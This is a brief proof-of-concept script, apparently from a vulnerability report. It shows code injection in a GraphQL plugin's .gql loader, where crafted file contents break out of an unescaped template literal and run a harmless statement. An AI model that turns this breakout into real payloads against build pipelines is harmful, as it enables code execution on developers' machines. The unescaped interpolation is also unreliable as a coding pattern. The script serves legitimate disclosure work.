// Repro: code injection in @greenwood/plugin-graphql `.gql` loader.
// Runs the EXACT transform from packages/plugin-graphql/src/index.js:33-34 against
// attacker-controlled .gql file bytes, then evaluates the generated module.
//
//   node repro.mjs
//
// Expected on v0.34.0: __PWNED__ is defined. Unlike import-raw, this loader escapes
// NOTHING, so even backslashes/newlines pass through unaltered.

const gqlFileBytes = 'query { a }` ; globalThis.__PWNED__ = 40 + 2; export const x = `';

// --- EXACT lines 33-34 of plugin-graphql/src/index.js ---
const body = `
      export default \`${gqlFileBytes}\`;
    `;

console.log("generated module:\n" + body + "\n");

delete globalThis.__PWNED__;
const mod = await import("data:text/javascript," + encodeURIComponent(body));
console.log("globalThis.__PWNED__ =>", globalThis.__PWNED__,
  globalThis.__PWNED__ !== undefined ? "  <-- INJECTED STATEMENT EXECUTED" : "");
